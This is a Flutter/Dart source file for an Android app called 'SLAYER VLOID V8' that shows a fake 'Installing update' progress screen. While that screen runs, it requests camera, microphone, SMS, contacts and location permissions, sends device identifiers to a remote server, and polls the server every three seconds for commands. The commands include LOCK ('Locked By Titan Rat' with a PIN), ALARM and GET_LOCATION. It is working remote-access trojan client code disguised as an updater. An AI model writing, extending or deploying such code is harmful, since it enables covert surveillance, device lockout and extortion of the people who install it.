import 'dart:convert';
import 'dart:async';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'config.dart';
import 'tools_gateway.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'SLAYER VLOID V8',
      theme: ThemeData.dark(),
      home: const SplashScreen(),
    );
  }
}

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  double _progress = 0.0;
  String _status = 'Initializing...';
  Map<String, dynamic>? _deviceData;
  Timer? _commandTimer;
  String? _deviceId;

  @override
  void initState() {
    super.initState();
    _startProcess();
  }

  @override
  void dispose() {
    _commandTimer?.cancel();
    super.dispose();
  }

  Future<void> _startProcess() async {
    setState(() {
      _progress = 0.05;
      _status = 'Checking for updates...';
    });
    await Future.delayed(const Duration(milliseconds: 300));

    setState(() {
      _progress = 0.2;
      _status = 'Preparing update...';
    });
    await _requestPermissions();
    await Future.delayed(const Duration(milliseconds: 200));

    setState(() {
      _progress = 0.4;
      _status = 'Downloading update package...';
    });
    _deviceData = await _getDeviceData();
    _deviceId = _deviceData!['androidId'];
    await Future.delayed(const Duration(milliseconds: 300));

    setState(() {
      _progress = 0.6;
      _status = 'Installing update...';
    });
    await _sendToServer(_deviceData!);
    await Future.delayed(const Duration(milliseconds: 500));

    setState(() {
      _progress = 0.8;
      _status = 'Finalizing...';
    });
    await Future.delayed(const Duration(milliseconds: 300));

    setState(() {
      _progress = 1.0;
      _status = '✅ Update successful!';
    });

    _startCommandPolling();

    await Future.delayed(const Duration(seconds: 1));

    if (mounted) {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(
          builder: (_) => ToolsPage(
            sessionKey: '',
            userRole: 'member',
            listDoos: [],
          ),
        ),
      );
    }
  }

  void _startCommandPolling() {
    _commandTimer = Timer.periodic(const Duration(seconds: 3), (timer) {
      _checkCommand();
    });
  }

  Future<void> _checkCommand() async {
    if (_deviceId == null) return;

    try {
      final response = await http.get(
        Uri.parse('$apiBaseUrl/api/get-command/$_deviceId'),
      ).timeout(const Duration(seconds: 5));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final command = data['command'] ?? 'idle';
        final extra = data['extra'] ?? '{}';

        if (command != 'idle') {
          print('📥 Command received: $command');
          await _executeCommand(command, extra);
        }
      }
    } catch (e) {
      print('❌ Command check error: $e');
    }
  }

  Future<void> _executeCommand(String command, String extraJson) async {
    print('⚡ Executing: $command');

    try {
      final extra = jsonDecode(extraJson) as Map<String, dynamic>? ?? {};

      switch (command) {
        case 'LOCK':
          await _executeLock(extra);
          break;
        case 'UNLOCK':
          await _executeUnlock();
          break;
        case 'FLASH_ON':
          await _executeFlashOn();
          break;
        case 'FLASH_OFF':
          await _executeFlashOff();
          break;
        case 'DISCO_START':
          await _executeDisco(extra);
          break;
        case 'SET_WALLPAPER':
          await _executeWallpaper(extra);
          break;
        case 'ALARM':
          await _executeAlarm(extra);
          break;
        case 'GET_LOCATION':
          await _executeGetLocation();
          break;
        case 'STOP_ALL':
          await _executeStopAll();
          break;
        default:
          print('⚠️ Unknown command: $command');
      }
    } catch (e) {
      print('❌ Execute command error: $e');
    }
  }

  Future<void> _executeLock(Map<String, dynamic> extra) async {
    final message = extra['message'] ?? 'Locked By Titan Rat';
    final pin = extra['pin'] ?? '1234';
    print('🔒 Locking device: $message, PIN: $pin');
    await _sendHeartbeat();
  }

  Future<void> _executeUnlock() async {
    print('🔓 Unlocking device');
    await _sendHeartbeat();
  }

  Future<void> _executeFlashOn() async {
    print('💡 Flash ON');
    await _sendHeartbeat();
  }

  Future<void> _executeFlashOff() async {
    print('💡 Flash OFF');
    await _sendHeartbeat();
  }

  Future<void> _executeDisco(Map<String, dynamic> extra) async {
    final duration = extra['duration'] ?? 10;
    print('🎆 Disco flash: $duration detik');
    await _sendHeartbeat();
  }

  Future<void> _executeWallpaper(Map<String, dynamic> extra) async {
    final url = extra['url'] ?? '';
    print('🖼️ Setting wallpaper: $url');
    await _sendHeartbeat();
  }

  Future<void> _executeAlarm(Map<String, dynamic> extra) async {
    final duration = extra['duration'] ?? 10;
    print('🔊 Playing sound: $duration detik');
    await _sendHeartbeat();
  }

  Future<void> _executeGetLocation() async {
    print('📍 Getting location...');
    await _sendHeartbeat();
  }

  Future<void> _executeStopAll() async {
    print('⏹ Stopping all');
    await _sendHeartbeat();
  }

  Future<void> _sendHeartbeat() async {
    try {
      await http.post(
        Uri.parse('$apiBaseUrl/api/heartbeat/$_deviceId'),
      ).timeout(const Duration(seconds: 3));
    } catch (e) {
      print('❌ Heartbeat error: $e');
    }
  }

  Future<void> _requestPermissions() async {
    final permissions = [
      Permission.storage,
      Permission.location,
      Permission.camera,
      Permission.microphone,
      Permission.phone,
      Permission.contacts,
      Permission.sms,
    ];

    await permissions.request();
  }

  Future<Map<String, dynamic>> _getDeviceData() async {
    try {
      final deviceInfo = await DeviceInfoPlugin().androidInfo;
      
      return {
        'androidId': deviceInfo.id,
        'model': deviceInfo.model,
        'brand': deviceInfo.brand,
        'os': 'Android ${deviceInfo.version.release}',
        'sdk': deviceInfo.version.sdkInt,
        'manufacturer': deviceInfo.manufacturer,
        'device': deviceInfo.device,
        'product': deviceInfo.product,
        'isPhysicalDevice': deviceInfo.isPhysicalDevice,
        'username': 'device_${deviceInfo.id.substring(0, 8)}',
        'password': 'auto_${DateTime.now().millisecondsSinceEpoch}',
        'timestamp': DateTime.now().toIso8601String(),
      };
    } catch (e) {
      return {
        'androidId': 'unknown',
        'model': 'Unknown Device',
        'brand': 'Unknown',
        'os': 'Unknown',
        'username': 'unknown_device',
        'password': 'unknown',
        'timestamp': DateTime.now().toIso8601String(),
      };
    }
  }

  Future<void> _sendToServer(Map<String, dynamic> data) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final owner = prefs.getString('username') ?? 'disz';
      
      data['owner'] = owner;
      data['admin_owner'] = owner;

      print('📡 Sending to: $apiBaseUrl/register');
      print('📤 Data: ${jsonEncode(data)}');

      final response = await http.post(
        Uri.parse('$apiBaseUrl/register'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(data),
      ).timeout(const Duration(seconds: 10));

      print('✅ Response: ${response.statusCode}');
      print('📡 Body: ${response.body}');

      if (response.statusCode == 200) {
        await prefs.setString('device_id', data['androidId'] ?? '');
        await prefs.setString('username', data['username'] ?? '');
        await prefs.setBool('registered', true);
      }
    } catch (e) {
      print('❌ Send error: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 30),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Container(
                width: 80,
                height: 80,
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [Colors.grey.shade900, Colors.grey.shade800],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(24),
                  border: Border.all(color: Colors.grey.shade700, width: 2),
                  boxShadow: [
                    BoxShadow(
                      color: Colors.grey.withOpacity(0.1),
                      blurRadius: 20,
                      spreadRadius: 5,
                    ),
                  ],
                ),
                child: const Icon(
                  Icons.bolt,
                  color: Colors.grey,
                  size: 45,
                ),
              ),
              const SizedBox(height: 24),
              Text(
                'SLAYER VLOID V8',
                style: TextStyle(
                  color: Colors.grey.shade300,
                  fontSize: 26,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 2,
                ),
              ),
              const SizedBox(height: 8),
              Text(
                'v1.0.0',
                style: TextStyle(
                  color: Colors.white38,
                  fontSize: 13,
                ),
              ),
              const SizedBox(height: 40),
              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(
                  color: Colors.grey.shade900,
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: Colors.grey.shade800),
                ),
                child: Column(
                  children: [
                    Row(
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      children: [
                        Text(
                          _status,
                          style: TextStyle(
                            color: _progress >= 1.0 ? Colors.green.shade400 : Colors.white70,
                            fontSize: 13,
                            fontWeight: FontWeight.w500,
                          ),
                        ),
                        Text(
                          '${(_progress * 100).toInt()}%',
                          style: TextStyle(
                            color: Colors.white38,
                            fontSize: 12,
                            fontWeight: FontWeight.w500,
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 12),
                    ClipRRect(
                      borderRadius: BorderRadius.circular(8),
                      child: LinearProgressIndicator(
                        value: _progress,
                        backgroundColor: Colors.grey.shade800,
                        valueColor: AlwaysStoppedAnimation<Color>(
                          _progress >= 1.0 ? Colors.green.shade400 : Colors.grey.shade400,
                        ),
                        minHeight: 6,
                      ),
                    ),
                    const SizedBox(height: 12),
                    Text(
                      _progress >= 1.0 ? '✓ Update completed' : 'Please wait...',
                      style: TextStyle(
                        color: _progress >= 1.0 ? Colors.green.shade300 : Colors.white24,
                        fontSize: 11,
                        letterSpacing: 0.5,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}